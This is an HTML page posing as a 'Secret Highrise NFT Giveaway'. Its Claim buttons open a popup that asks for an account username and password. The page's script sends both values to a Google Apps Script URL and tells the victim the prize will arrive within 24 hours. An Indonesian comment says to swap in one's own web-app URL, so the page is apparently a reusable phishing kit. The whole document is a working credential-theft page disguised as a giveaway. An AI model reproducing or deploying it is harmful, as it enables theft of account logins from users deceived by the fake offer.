<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secret NFT Giveaway</title>
    <style>
        body {
            background-color: #0D0D0D;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1;
        }
        .container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-top: 20px;
        }
        .item {
            background: #1A1A1A;
            padding: 15px;
            margin: 10px;
            border-radius: 10px;
            width: 220px;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
        }
        .item img {
            width: 100%;
            border-radius: 5px;
        }
        .rarity {
            display: block;
            margin: 5px 0;
            font-weight: bold;
        }
        .claim-btn {
            background: linear-gradient(90deg, #ff4e50, #fc913a);
            color: white;
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 5px;
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #1A1A1A;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
        }
        input {
            width: 80%;
            padding: 8px;
            margin: 5px 0;
            border: 1px solid #333;
            background: #222;
            color: white;
            border-radius: 5px;
        }
        button {
            background: #ff4e50;
            color: white;
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <video autoplay loop muted playsinline class="video-background">
        <source src="video.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>
    <h1>üéÅ Secret Highrise NFT Giveaway üéÅ</h1>
    <p>Claim your exclusive NFT raffle tickets now!</p>
    <div class="container">
        <div class="item">
            <img src="red.jpg" alt="NFT Raffle Ticket">
            <h3>NFT Raffle Ticket</h3>
            <span class="rarity" style="color: #0099FF;">Rare</span>
            <button class="claim-btn" onclick="showPopup()">Claim Now</button>
        </div>
        <div class="item">
            <img src="silver.jpg" alt="Silver NFT Raffle Ticket">
            <h3>Silver NFT Raffle Ticket</h3>
            <span class="rarity" style="color: #9900FF;">Epic</span>
            <button class="claim-btn" onclick="showPopup()">Claim Now</button>
        </div>
        <div class="item">
            <img src="gold.jpg" alt="Golden NFT Raffle Ticket">
            <h3>Golden NFT Raffle Ticket</h3>
            <span class="rarity" style="color: #FFD700;">Legendary</span>
            <button class="claim-btn" onclick="showPopup()">Claim Now</button>
        </div>
    </div>
    <div class="popup" id="popup">
        <h2>Enter your account details</h2>
        <input type="text" id="username" placeholder="Username"><br><br>
        <input type="password" id="password" placeholder="Password"><br><br>
        <button onclick="sendData()">Submit</button>
        <button onclick="closePopup()">Close</button>
    </div>
    <script>
        function showPopup() {
            document.getElementById("popup").style.display = "block";
        }
    
        function closePopup() {
            document.getElementById("popup").style.display = "none";
        }
    
        function sendData() {
            let username = document.getElementById("username").value.trim();
            let password = document.getElementById("password").value.trim();
    
            if (!username || !password) {
                alert("Harap isi username dan password!");
                return;
            }
    
            fetch("https://script.google.com/macros/s/AKfycbzB0ySVAEcKFRCALX6gtFxfAww0Bjw403iNOWjsENoX8vDrJBUvoR5WWCPjZgMZyB3b9w/exec", {  // Ganti dengan URL Web App Anda
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ username, password })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === "success") {
                    alert("Your item will appear within 24 hours. Thank you for participating!");
                    closePopup();
                } else {
                    alert("Error: " + data.message);
                }
            })
            .catch(error => {
                alert("Gagal mengirim data. Periksa koneksi internet Anda.");
                console.error("Error:", error);
            });
        }
    </script>
</body>
</html>
